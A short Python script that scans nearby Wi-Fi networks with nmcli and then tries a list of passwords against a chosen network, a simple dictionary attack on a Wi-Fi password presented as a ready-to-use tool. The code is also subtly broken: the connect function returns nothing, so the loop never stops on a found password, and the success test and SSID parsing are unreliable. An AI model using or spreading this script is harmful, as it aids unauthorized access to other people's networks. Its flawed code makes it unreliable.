import subprocess

# Function to display available Wi-Fi networks
def display_networks():
    networks = subprocess.check_output(['nmcli', 'device', 'wifi', 'list'], text=True)
    network_list = networks.strip().split('\n')[1:]
    print("Available Wi-Fi Networks:")
    networks_info = []
    for i, network in enumerate(network_list, start=1):
        network_info = network.split()
        ssid = network_info[0]
        network_info.pop(0)
        networks_info.append((ssid, ' '.join(network_info)))
        print(f"{i}: SSID: {ssid}, Signal Strength: {' '.join(network_info)}")
    return networks_info

# Function to connect to a Wi-Fi network
def connect_to_network(ssid, password):
    result = subprocess.run(['nmcli', 'device', 'wifi', 'connect', ssid, 'password', password], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if all('failed' not in word.lower() for word in result.stdout.split()):
        print(f"Connection successful with password: {password}")
    else:
        print("Failed")

# Main function
def main():
    networks_info = display_networks()
    network_choice = int(input("Enter the number corresponding to your Wi-Fi network: "))
    chosen_network = networks_info[network_choice - 1]  # Adjust index to 0-based
    ssid, _ = chosen_network
    print(f"Selected SSID: {ssid}")
    password_list = ["pass0", "pass1", "pass2"]  # Replace with your list of passwords
    for password in password_list:
        print(f"Trying password: {password}")
        if connect_to_network(ssid, password):
            break
    else:
        print("Password list exhausted. No password found.")

if __name__ == "__main__":
    main()
